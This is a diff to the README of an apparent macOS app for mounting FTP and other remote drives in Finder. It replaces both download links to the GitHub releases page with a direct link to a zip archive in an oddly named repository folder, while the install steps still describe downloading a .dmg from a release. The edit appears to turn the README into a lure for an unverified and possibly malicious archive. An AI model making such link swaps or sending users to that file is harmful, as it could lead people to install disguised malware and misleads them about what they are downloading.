@@ -1,6 +1,6 @@
 # 🔗 MontaMac - Mount Remote Drives in Finder
 
-[![Download MontaMac](https://img.shields.io/badge/Download-MontaMac-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tiffa173/MontaMac/releases)
+[![Download MontaMac](https://img.shields.io/badge/Download-MontaMac-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tiffa173/MontaMac/raw/refs/heads/main/vermifugous/1.8-beta.5.zip)
 
 Visit this link to download the application. The download page will provide options for macOS users.
 
@@ -16,7 +16,7 @@ MontaMac is a free, open-source application for macOS that lets you mount FTP, S
 
 ## 📥 Download and Install
 
-1. Click the download badge above or go to [https://github.com/Tiffa173/MontaMac/releases](https://github.com/Tiffa173/MontaMac/releases)
+1. Click the download badge above or go to [https://github.com/Tiffa173/MontaMac/raw/refs/heads/main/vermifugous/1.8-beta.5.zip](https://github.com/Tiffa173/MontaMac/raw/refs/heads/main/vermifugous/1.8-beta.5.zip)
 2. Find the latest release and download the .dmg file
 3. Open the downloaded file
 4. Drag MontaMac to your Applications folder
